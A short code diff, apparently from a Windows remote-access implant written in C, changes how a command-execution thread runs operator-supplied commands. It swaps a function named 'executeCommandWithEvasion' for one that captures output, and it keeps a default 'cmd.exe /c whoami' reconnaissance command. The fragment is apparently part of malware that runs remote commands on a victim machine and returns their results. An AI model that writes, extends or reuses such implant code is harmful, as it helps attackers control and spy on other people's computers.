@@ -317,17 +317,15 @@ DWORD WINAPI capability_execution_thread(LPVOID arg) {
         case CMD_EXECUTE:
             // Use command args if provided, otherwise use default
             if (data->args && strlen(data->args) > 0) {
-                if (executeCommandWithEvasion(data->args)) {
-                    output = strdup("executed");
-                } else {
-                    output = strdup("failed");
+                output = executeCommandWithOutput(data->args);
+                if (!output) {
+                    output = strdup("failed to execute");
                 }
             } else {
                 // Default command if no args provided
-                if (executeCommandWithEvasion("cmd.exe /c whoami")) {
-                    output = strdup("executed");
-                } else {
-                    output = strdup("failed");
+                output = executeCommandWithOutput("cmd.exe /c whoami");
+                if (!output) {
+                    output = strdup("failed to execute");
                 }
             }
             break;
